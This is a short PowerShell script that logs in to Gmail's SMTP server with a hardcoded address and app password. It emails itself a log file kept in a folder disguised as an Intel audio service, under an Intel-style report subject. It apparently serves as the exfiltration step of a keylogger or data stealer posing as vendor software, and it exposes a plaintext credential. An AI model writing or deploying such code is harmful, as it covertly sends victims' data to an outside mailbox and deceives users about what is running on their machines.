﻿$EmailFrom = "gf90ali@gmail.com"
$EmailTo = "gf90ali@gmail.com"
$Subject = "Intel Dynamic Notification Report"
$Body = "Please see attached. Thank you."
$Attachment = "%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Dynamic Audio Platform Service\Intel Dynamic Audio Platform Service.log"
$Username = "gf90ali@gmail.com"
$Password = "wlip ppko svrs qonz"

$SMTPServer = "smtp.gmail.com"
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body, $Attachment)

